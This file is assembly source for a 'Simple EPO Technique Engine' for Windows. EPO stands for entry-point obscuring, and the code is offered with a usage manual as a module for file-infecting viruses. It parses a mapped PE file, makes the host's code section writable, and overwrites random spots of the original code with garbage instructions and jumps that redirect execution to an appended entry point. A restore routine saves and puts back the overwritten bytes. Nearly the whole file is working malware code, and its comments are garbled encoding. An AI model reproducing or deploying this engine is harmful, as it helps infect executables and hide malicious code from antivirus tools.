;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                       [SIMPLE EPO TECHNIQUE ENGINE  V. 0.1]                  ;
;                                                                              ;
;	    ###########    ###########    ############   ##############        ;
;	   #############  #############  ##############  ##############        ;
;	   ##             ###        ##  ###        ###       ###              ;
;	   ############   #############  ###        ###       ###              ;
;	    ############  ############   ###        ###       ###              ;
;	             ###  ###            ###        ###       ###              ;
;	   #############  ###            ##############       ###              ;
;	    ###########   ###             ############        ###              ;
;                                                                              ;
;                                 FOR MS WINDOWS                               ;
;                                                                              ;
;                                     BY SL0N                                  ;
;------------------------------------------------------------------------------;
;                                    MANUAL:                                   ;
; ADDRESS OF MAPPED FILE  -> EDX                               		       ;
;                                                                              ;
; CALL EPO                                                                     ;
;------------------------------------------------------------------------------;
;                               MANUAL FOR RESTORE:                            ;
; CALL RESTORE                                                                 ;
;                                                                              ;
; ENTRY POINT             -> EBX                                               ;
;------------------------------------------------------------------------------;
; (+) DO NOT USE WIN API                                                       ;
; (+) EASY TO USE                                                              ;
; (+) GENERATE GARBAGE INSTRUCTIONS (1,2,3,4,5,6 BYTES)                        ;
; (+) USE X87 INSTRUCTIONS                                                     ;
; (+) RANDOM NUMBER OF SPOTS                                                   ;
; (+) MUTABLE SPOTS                                                            ;
; (+) RANDOM LENGTH OF JUMP                                                    ;
;------------------------------------------------------------------------------;
epo:            
		push	esi edi                    ; ��������� � ����� esi 
		                                   ; � edi
		mov	[ebp+map_address],edx      ; ��������� ����� ����� �
		                                   ; ������
		call	get_head                   ; ��������  PE ���������
		                                   ;
		call	search_eip                 ; ��������� ����� �����
		                                   ; �����
		call	find_code		   ; ���� ������ ���� � ���� 
						   ; �����
		call	spots			   ; �������� ���� ������� 
						   ; �� �����
		pop	edi esi                    ; ��������������� �� �����
		                                   ; edi � esi
		ret				   ; ������� �� ������������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                      PE HEADER SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              FILE IN MEMORY -> EDX                            ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;

get_head:                                          
						   ; ������������ ���������
                                                   ; PE ���������

		pusha                              ; ��������� �� � �����

		mov 	ebx,[edx + 3ch]            ;
		add 	ebx,edx                    ;
		                                   ;
		mov 	[ebp + PE_header],ebx	   ; ��������� PE ���������
		mov 	esi,ebx                    ;
		mov	edi,esi                    ;
		mov 	ebx,[esi + 28h]            ;
		mov 	[ebp + old_eip],ebx	   ; ��������� ������ �����
						   ; ����� (eip)
		mov 	ebx,[esi + 34h]            ;
		mov 	[ebp + image_base],ebx	   ; ���������
                                                   ; ����������� ����� 
						   ; ������ ���������
                popa                               ; �������� �� �� �����
		ret				   ; ������� �� ������������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    NEW ENTRY POINT SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
search_eip:                                        
						   ; ������������ ����������
                                                   ; ����� ����� �����

		pusha                              ; ��������� �� � �����

		mov	esi,[ebp+PE_header]        ; ����� � esi ���������
		                                   ; �� PE ���������
		mov 	ebx,[esi + 74h]		   ; 	
		shl 	ebx,3			   ; 
		xor 	eax,eax			   ;
		mov 	ax,word ptr [esi + 6h]     ; ���������� ��������
		dec 	eax			   ; (��� ����� ���������-1
		mov 	ecx,28h			   ; ��������� ������)
		mul 	ecx			   ; * ������ ���������
		add 	esi,78h			   ; ������ esi ��������� 
		add 	esi,ebx			   ; �� ������ ����������  
		add 	esi,eax			   ; ��������� ������

		mov	eax,[esi+0ch]              ; 
		add	eax,[esi+10h]              ; ��������� ����� �����
		mov	[ebp+new_eip],eax          ; �����

                popa                               ; �������� �� �� �����

		ret				   ; ������� �� ������������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                  FIND START OF CODE SUBROUTINE			       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
find_code:                                         
						   ; ������������ ������ ������
                                                   ; ����

		mov	esi,[ebp+PE_header]        ; ����� � esi ���������
		                                   ; �� PE ���������

		mov 	ebx,[esi + 74h]		   ;
		shl 	ebx,3			   ; �������� 
		xor 	eax,eax			   ; 
		mov 	ax,word ptr [esi + 6h]	   ; ���������� ��������
find2:
		mov	esi,edi                    ;
		dec	eax                        ; 
		push	eax                        ; (��� ����� ���������-1
		mov 	ecx,28h			   ; ��������� ������)
		mul 	ecx			   ; * ������ ���������
		add 	esi,78h			   ; ������ esi ��������� ��
		add 	esi,ebx			   ; ������ ���������� 
						   ; ��������� 
		add 	esi,eax			   ; ������
		mov	eax,[ebp+old_eip]	   ; � eax ����� ����� �����
		mov	edx,[esi+0ch]		   ; � edx ����� ���� �����
						   ; ��������
						   ; ������� ������
		cmp	edx,eax			   ; ���������
		pop	eax			   ; �������� �� ����� eax
		jg	find2			   ; ���� ������ ���� ������
		add	edx,[esi+08h]		   ; ��������� ����������� 
						   ; ������ �����
		cmp	edx,[ebp+old_eip]	   ; ���������
		jl	find2			   ; ���� ������ ���� ������

		mov	edx,[esi+0ch]		   ; ����� ��������� 
						   ; ����������
		mov	eax,[ebp+old_eip]	   ; �������� ���� � �����
		sub	eax,edx			   ;
		add	eax,[esi+14h]	           ;
		add	eax,[ebp+map_address]	   ; � ����� ��������� ����
						   ; ������

		mov	[ebp+start_code],eax	   ; ��������� ������ ����

                or 	[esi + 24h],00000020h or 20000000h or 80000000h 
						   ; ������ ��������� 
						   ; ������� ������

		mov	eax,[esi+08]               ; ��������� ������
		sub	eax,[ebp+old_eip]          ; ��� ����� ������� ������,
		mov	edx,[esi+10h]              ; ��� ����� ���������
		sub	edx,eax                    ; �����
		mov	[ebp+size_for_spot],edx    ;

		ret				   ; ������� �� ���������

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    SPOTS GENERATION SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
spots:                                             
						   ; ������������ ���������
						   ; �����

		mov	ecx,1                      ; ����� � ecx �������
		                                   ;
		call	reset                      ; �������������� ������
		call	num_spots                  ; ���������� ��������� �����
		                                   ; ��� ����� ���-�� �����
tred:                                              
		call	save_bytes	           ; ��������� ��������� �����
		call	gen_spot                   ; ���������� �����

		inc	ecx                        ; ����������� ecx �� �������
		cmp	ecx,[ebp+n_spots]          ; ��� ����� �������������
		jne	tred                       ; ���� ���, �� ����������

		call	save_bytes		   ; ��������� ��������� �����
		call	gen_final_spot             ; � ���������� ���������
		                                   ; �����
		ret				   ; ������� �� ���������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    SPOT GENERATION SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
gen_spot:                                          
						   ; ������������ ��������� 
						   ; ������ �����

		push	eax ecx                    ; ��������� eax � ecx

		call	len_sp_jmp                 ; �������� ��������� �����
		xchg	eax,ebx                    ; ������ �����

		call	testing                    ; ���������, ����� �����
		jc	quit2                      ; �� �������� �� �������
                                                   ; ������
		push	ebx
		xor	bx,bx
		dec	bx
		mov	ecx,[ebp+num1]             ; ���������� ������ ������
		call	garbage                    ; ������
		pop	ebx

		mov	al,0e9h                    ; 
		stosb                              ;
		mov	eax,0                      ; ���������� jmp
		add	eax,ebx                    ;
		add	eax,ecx                    ;
		stosd                              ;

		push	ebx
		xor	bx,bx
		dec	bx
		mov	ecx,[ebp+num2]             ; ���������� ������ ������
		call	garbage                    ; ������
		pop	ebx

		sub	edi,[ebp+num2]             ; 
		add	edi,[ebp+num1]             ; ������������ edi
		add	edi,ebx                    ;
quit2:
		pop	ecx eax                    ; ��������������� ecx � eax

		ret                                ; ������� �� ������������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                  LAST SPOT GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
gen_final_spot:                                    
                                                   ; ������������ ���������
						   ; ���������� �����
 
		push	eax ecx                    ; ��������� eax � ecx
		                                   
		jc	not_big                    ; ���� ����� �� ���������
		inc	[ebp+n_spots]              ; ������� ������� ������, ��
not_big:                                           ; �������� ���-�� �����
		mov	ecx,[ebp+num1]             ; ���������� ��������
		call	garbage                    ; ����������

		push	edi                        ; ��������� edi
		sub	edi,[ebp+start_code]       ; �������������� ����� jmp'a
		mov	ebx,edi                    ; ��� ���������� �����
		pop	edi                        ; ��������������� edi

		mov	al,0e9h                    ;
		stosb                              ;
		mov	eax,0                      ;
		sub	eax,5                      ; ���������� ���������
		sub	eax,ebx                    ; �����
		add	eax,[ebp+new_eip]          ;
		sub	eax,[ebp+old_eip]          ;
		stosd                              ;

		mov	ecx,[ebp+num2]             ; ���������� ������ ������
		call	garbage                    ; �������� ����������

		pop	ecx eax                    ; ��������������� ecx � eax
		ret                                ; ������� �� ������������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    SPOTS GENERATION SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;                        ADDRESS OF SAVING BYTES -> EDI                        ;
;                        QUANTITY OF BYTES       -> EBX		               ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;                            NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
save_bytes:
						   ; ������������ ����������
						   ; ���������� ����

                pusha		                   ; ��������� �� � �����
		call	length1                    ; ���������� ����� ��������
		                                   ; ����������
		mov	ebx,[ebp+num1]             ; �������� � ebx ������ 
		add	ebx,[ebp+num2]             ; � ������ �����
		add	ebx,5                      ; ��������� � ebx - 5

		mov	esi,edi                    ; ��������� � ������ � 
		mov	edi,[ebp+pointer]          ; ������ �������� � ������
		mov	eax,esi                    ; �� ����������� �����
		stosd                              ;
		mov	ecx,ebx                    ; ����� ����� ��������� �
		mov	eax,ecx                    ; ������ ���-�� �����������
		stosd                              ; ����

		rep	movsb                      ; � � ����� ����� ���������
		mov	[ebp+pointer],edi          ; � ������ ���� �����
		                                   ;
		popa                               ; �������� �� �� �����
		ret                                ; ������� �� ������������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                       RESTORE SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      OLD ENTRY POINT -> EBX			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
restore:
						   ; ������������ 
						   ; �������������� ����������
						   ; ����

		cld                                ; ����� �����
		lea	esi,[ebp+rest_bytes]       ; � esi ����������� �� �����
		mov	edx,1                      ; � edx ����� - 1
not_enough:
		mov	edi,[ebp+old_eip]          ; � edi ��������� �����
		add	edi,[ebp+image_base]       ; �����
		mov	ebx,edi                    ; ��������� edi � ebx
		lodsd                              ; � eax ������ ��������
		                                   ; ���� � ������
		sub	eax,[ebp+start_code]       ; �������� �������� ������
		                                   ; ���� � ��������� 
		add	edi,eax                    ; ����� �����
		lodsd                              ; ��������� � eax ���-�� 
		mov	ecx,eax                    ; ���� � ����� �� � ecx
		rep	movsb                      ; ���������� ������������
		                                   ; ����� �� ������ �����
		inc	edx                        ; ��������� � ���������� 
		cmp	edx,[ebp+n_spots]          ; �����
		jl	not_enough                 ; ���� �� ��� ����� �������,
		                                   ; �� ��������������� ������
quit:                                              ;  
		ret				   ; ������� �� ���������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	               LENGTH SPOT GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
length1:
						   ; ������������ ���������
						   ; ���� �������� ����������
		mov	eax,20                     ;
		call	brandom32                  ; ���������� ��������� �����
		test	eax,eax                    ; � ��������� 1..19
		jz	length1                    ;

		mov	[ebp+num1],eax             ; ��������� ��� � ����������
rand2:
		mov	eax,20                     ;
		call	brandom32                  ; ���������� ��������� �����
		test	eax,eax                    ; � ��������� 1..19
		jz	rand2                      ;

		mov	[ebp+num2],eax             ; ��������� ��� � ������
		                                   ; ����������
		ret				   ; ������� �� ���������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                        RESET SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
reset:
						   ; ������������ �������������
						   ; ����������
		mov	edi,[ebp+start_code]       ;
		                                   ; 
		push	esi                        ; �������������� ����������
		lea	esi,[ebp+rest_bytes]       ;
		mov	[ebp+pointer],esi          ;
		pop	esi                        ;

		ret				   ; ������� �� ���������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	             SPOT JUMP LENGTH GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			    LENGTH OF SPOT JUMP -> EAX			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
len_sp_jmp:
						   ; ������������ ���������
						   ; ����� ������

		mov	eax,150                    ;
		call	brandom32                  ; ���������� ��������� �����
		cmp	eax,45                     ; � ��������� 45..149
		jle	len_sp_jmp		   ;

 		ret				   ; ������� �� ���������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                SPOTS NUMBER GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
num_spots:
						   ; ������������ ���������
						   ; ���������� �����

		pusha                              ; ��������� �� � �����

		mov	eax,40                     ; ���������� ��������� �����
		call	brandom32                  ; � ��������� 1..40
		inc	eax                        ; � ��������� ��� �
		mov	[ebp+n_spots],eax          ; ����������

		popa                               ; �������� �� �� �����
		ret				   ; ������� �� ���������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                       TESTING SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;		                   CARRY FLAG			       	       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
testing:
						   ; ������������ ��������
						   ; ��������� � ������� ������

		push	edi eax                    ; ��������� edi eax � �����

		add	edi,[ebp+num1]             ; ������� � edi 1-�� �����
						   ; �������� ����������
		add	edi,[ebp+num2]             ; ����� ����� ������� 2-��
		add	edi,300                    ; � ������� ����� � �������
						   ; ������ ������������ ������
						   ; ����� + ����� ��� ������
		mov	eax,[ebp+size_for_spot]    ; � eax �������� ������ 
						   ; ����� ��� ����� � ��������
		add	eax,[ebp+start_code]       ; � ������ ����� �����

		cmp	edi,eax                    ; ������� eax � edi
		clc                                ; ������� carry ����
		jl	m_space                    ; ���� edi ������, �� ���
		                                   ; ������
		mov	[ebp+n_spots],ecx          ; ���� ���, �� �� ���������
		inc	[ebp+n_spots]              ; ���������� ����� � 
		stc                                ; ������������� carry ����
m_space:
		pop	eax edi		           ; �������� eax � edi 
		ret				   ; ������� �� ���������
;------------------------------------------------------------------------------;
pointer		dd	0                          ;
n_spots		dd	0                          ;
                                                   ;
num1		dd	0                          ;
num2		dd	0                          ;
                                                   ; ������ ����������� ���
PE_header	dd	0                          ; ������ ������
old_eip		dd	0                          ;
image_base	dd	0                          ;
start_code	dd	0                          ;
new_eip		dd	0                          ;
map_address	dd	0                          ;
size_for_spot	dd	0                          ;
rest_bytes:	db	2100 dup (?)               ;
;------------------------------------------------------------------------------;
